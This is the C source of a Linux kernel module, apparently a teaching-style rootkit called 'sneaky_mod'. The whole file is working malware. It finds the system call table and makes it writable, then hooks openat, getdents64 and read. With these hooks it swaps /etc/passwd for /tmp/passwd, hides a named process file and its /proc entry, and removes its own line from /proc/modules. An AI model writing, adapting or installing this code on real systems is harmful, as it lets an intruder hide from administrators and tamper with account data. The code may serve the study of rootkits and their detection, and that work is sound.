#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <asm/current.h>
#include <linux/sched.h>
#include <linux/highmem.h>
#include <asm/unistd.h>
#include <linux/kallsyms.h>
#include <asm/page.h>
#include <asm/cacheflush.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/dcache.h>
#include <linux/fdtable.h>
#include <linux/file.h>
#include <linux/dirent.h>

#define PREFIX "sneaky_process"

// Module parameter: pid of sneaky_process
static int pid = 0;
module_param(pid, int, 0);
MODULE_PARM_DESC(pid, "PID of sneaky_process");

// This is a pointer to the system call table
static unsigned long *sys_call_table;

// Helper to find symbol address from /proc/kallsyms
static unsigned long find_sys_call_table(void)
{
    unsigned long addr = 0;
    struct file *f;
    loff_t pos = 0;
    char buf[256];

    f = filp_open("/proc/kallsyms", O_RDONLY, 0);
    if (IS_ERR(f)) {
        printk(KERN_ERR "sneaky_mod: cannot open /proc/kallsyms\n");
        return 0;
    }

    while (kernel_read(f, buf, sizeof(buf) - 1, &pos) > 0) {
        unsigned long a;
        char t;
        char n[64];

        buf[sizeof(buf) - 1] = '\0';
        if (sscanf(buf, "%lx %c %63s", &a, &t, n) == 3) {
            if (strcmp(n, "sys_call_table") == 0) {
                addr = a;
                break;
            }
        }
    }
    filp_close(f, NULL);
    return addr;
}

// Helper functions, turn on and off the PTE address protection mode
int enable_page_rw(void *ptr)
{
    unsigned int level;
    pte_t *pte = lookup_address((unsigned long) ptr, &level);
    if (pte->pte & ~_PAGE_RW)
        pte->pte |= _PAGE_RW;
    return 0;
}

int disable_page_rw(void *ptr)
{
    unsigned int level;
    pte_t *pte = lookup_address((unsigned long) ptr, &level);
    pte->pte = pte->pte & ~_PAGE_RW;
    return 0;
}

// Original syscall function pointers
asmlinkage int (*original_openat)(struct pt_regs *);
asmlinkage int (*original_getdents64)(struct pt_regs *);
asmlinkage int (*original_read)(struct pt_regs *);

// Sneaky version of openat: redirect /etc/passwd to /tmp/passwd
asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
{
    const char __user *pathname = (const char __user *)regs->si;
    char buf[256];
    int ret;

    ret = strncpy_from_user(buf, pathname, sizeof(buf) - 1);
    if (ret > 0) {
        buf[ret] = '\0';
        if (strcmp(buf, "/etc/passwd") == 0) {
            const char *newpath = "/tmp/passwd";
            if (copy_to_user((void __user *)pathname, newpath, strlen(newpath) + 1) == 0)
                printk(KERN_INFO "sneaky_mod: redirected /etc/passwd -> /tmp/passwd\n");
        }
    }

    return original_openat(regs);
}

// Sneaky version of getdents64: hide sneaky_process file and /proc/<pid> dir
asmlinkage int sneaky_sys_getdents64(struct pt_regs *regs)
{
    struct linux_dirent64 __user *dirp = (struct linux_dirent64 __user *)regs->si;
    int nread = original_getdents64(regs);
    char *kbuff, *kptr;
    int bpos = 0;
    int new_nread = 0;
    char pid_str[32];

    if (nread <= 0)
        return nread;

    snprintf(pid_str, sizeof(pid_str), "%d", pid);

    kbuff = kmalloc(nread, GFP_KERNEL);
    if (!kbuff)
        return nread;

    if (copy_from_user(kbuff, dirp, nread)) {
        kfree(kbuff);
        return nread;
    }

    kptr = kbuff;
    while (bpos < nread) {
        struct linux_dirent64 *d = (struct linux_dirent64 *)(kbuff + bpos);
        int reclen = d->d_reclen;
        int hide = 0;

        if (strcmp(d->d_name, "sneaky_process") == 0)
            hide = 1;
        else if (pid > 0 && strcmp(d->d_name, pid_str) == 0)
            hide = 1;

        if (!hide) {
            if (kptr != kbuff + bpos)
                memmove(kptr, kbuff + bpos, reclen);
            kptr += reclen;
            new_nread += reclen;
        }

        bpos += reclen;
    }

    if (copy_to_user(dirp, kbuff, new_nread)) {
        kfree(kbuff);
        return nread;
    }

    kfree(kbuff);
    return new_nread;
}

// Sneaky version of read: hide sneaky_mod line from /proc/modules
asmlinkage int sneaky_sys_read(struct pt_regs *regs)
{
    int fd = regs->di;
    char __user *buf = (char __user *)regs->si;
    int nread = original_read(regs);
    char *kbuff;
    struct file *file;
    char path_buf[256];
    char *path;
    int is_modules = 0;
    char *line;

    if (nread <= 0)
        return nread;

    file = fget(fd);
    if (file) {
        path = d_path(&file->f_path, path_buf, sizeof(path_buf));
        if (strcmp(path, "/proc/modules") == 0)
            is_modules = 1;
        fput(file);
    }

    if (!is_modules)
        return nread;

    kbuff = kmalloc(nread, GFP_KERNEL);
    if (!kbuff)
        return nread;

    if (copy_from_user(kbuff, buf, nread)) {
        kfree(kbuff);
        return nread;
    }

    line = strstr(kbuff, "sneaky_mod");
    if (line) {
        char *line_end = strchr(line, '\n');
        if (line_end) {
            int line_len;
            int rest;
            line_end++; // include the newline
            line_len = line_end - line;
            rest = nread - (line_end - kbuff);
            memmove(line, line_end, rest);
            nread -= line_len;
        }
    }

    if (copy_to_user(buf, kbuff, nread)) {
        kfree(kbuff);
        return nread;
    }

    kfree(kbuff);
    return nread;
}

// The code that gets executed when the module is loaded
static int initialize_sneaky_module(void)
{
    printk(KERN_INFO "Sneaky module being loaded.\n");

    sys_call_table = (unsigned long *)find_sys_call_table();
    if (!sys_call_table) {
        printk(KERN_ERR "sneaky_mod: failed to find sys_call_table\n");
        return -EINVAL;
    }
    printk(KERN_INFO "sneaky_mod: sys_call_table at %p\n", sys_call_table);

    original_openat = (void *)sys_call_table[__NR_openat];
    original_getdents64 = (void *)sys_call_table[__NR_getdents64];
    original_read = (void *)sys_call_table[__NR_read];

    enable_page_rw((void *)sys_call_table);
    sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
    sys_call_table[__NR_getdents64] = (unsigned long)sneaky_sys_getdents64;
    sys_call_table[__NR_read] = (unsigned long)sneaky_sys_read;
    disable_page_rw((void *)sys_call_table);

    return 0;
}

static void exit_sneaky_module(void)
{
    printk(KERN_INFO "Sneaky module being unloaded.\n");

    enable_page_rw((void *)sys_call_table);
    sys_call_table[__NR_openat] = (unsigned long)original_openat;
    sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
    sys_call_table[__NR_read] = (unsigned long)original_read;
    disable_page_rw((void *)sys_call_table);
}

module_init(initialize_sneaky_module);
module_exit(exit_sneaky_module);
MODULE_LICENSE("GPL");
